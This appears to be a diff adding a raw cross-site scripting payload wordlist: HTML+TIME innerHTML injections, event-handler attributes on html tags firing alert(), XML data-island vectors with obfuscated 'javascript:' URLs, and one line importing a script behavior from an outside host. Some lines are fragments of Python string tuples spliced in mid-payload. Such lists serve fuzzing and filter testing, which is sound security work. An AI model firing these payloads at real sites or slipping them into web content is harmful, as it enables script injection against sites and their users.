@@ -1,0 +1,82 @@
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(957)&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1608)&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(694)&lt;/SCRIPT&gt;"></BODY></HTML>
+<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
+</html>//["'`-->]]>]</div>
+<html draggable="true" ondrag="alert(1)">test</html>
+<html draggable="true" ondragend="alert(1)">test</html>
+<html draggable="true" ondragenter="alert(1)">test</html>
+<html draggable="true" ondragleave="alert(1)">test</html>
+<html draggable="true" ondragstart="alert(1)">test</html>
+<html id=x tabindex=1 onactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforeactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>
+<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>
+<html id=x tabindex=1 onfocus=alert(1)></html>
+<html id=x tabindex=1 onfocusin=alert(1)></html>
+<html><noalert><noscript>(123)</noscript><script>(123)</script>
+<html onbeforecopy="alert(1)" contenteditable>test</html>
+<html onbeforecut="alert(1)" contenteditable>test</html>
+<html onbeforepaste="alert(1)" contenteditable>test</html>
+<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onclick="alert(1)">test</html>
+<html oncontextmenu="alert(1)">test</html>
+<html oncopy="alert(1)" contenteditable>test</html>
+<html oncut="alert(1)" contenteditable>test</html>
+<html ondblclick="alert(1)">test</html>
+<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onkeydown="alert(1)" contenteditable>test</html>
+<html onkeypress="alert(1)" contenteditable>test</html>
+<html onkeyup="alert(1)" contenteditable>test</html>
+<html onmousedown="alert(1)">test</html>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1221)"></html onMouseDown>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(322)"></html onMouseDown>
+<html onmouseenter="alert(1)">test</html>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1219)"></html onMouseEnter>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(320)"></html onMouseEnter>
+<html onmouseleave="alert(1)">test</html>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1208)"></html onMouseLeave>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(309)"></html onMouseLeave>
+<html onmousemove="alert(1)">test</html>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1232)"></html onMouseMove>
+<html onmousemove html onmousemove="javascript:javascript:alert(1249)"></html onmousemove>
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(333)"></html onMouseMove>
+<html onmousemove html onmousemove="javascript:javascript:alert(350)"></html onmousemove>
+<html onmouseout="alert(1)">test</html>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1227)"></html onMouseOut>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(328)"></html onMouseOut>
+<Html Onmouseover=(alert)(1) //
+<html onmouseover="alert(1)">test</html>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1218)"></html onMouseOver>
+<html onmouseover html onmouseover="javascript:javascript:alert(1241)"></html onmouseover>
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(319)"></html onMouseOver>
+<html onmouseover html onmouseover="javascript:javascript:alert(342)"></html onmouseover>
+<html onmouseup="alert(1)">test</html>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1200)"></html onMouseUp>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(301)"></html onMouseUp>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1209)"></html onMouseWheel>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(310)"></html onMouseWheel>
+<html onpaste="alert(1)" contenteditable>test</html>
+<html ontouchcancel=alert(1)>
+<html ontouchend=alert(1)> 
+<html ontouchmove=alert(1)> 
+<html ontouchstart=alert(1)> 
+HTML+TIME in XML
+<html xmlns="http://www.w3.org/1999/xhtml">
+<;HTML xmlns:xss>;
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1607)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(693)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
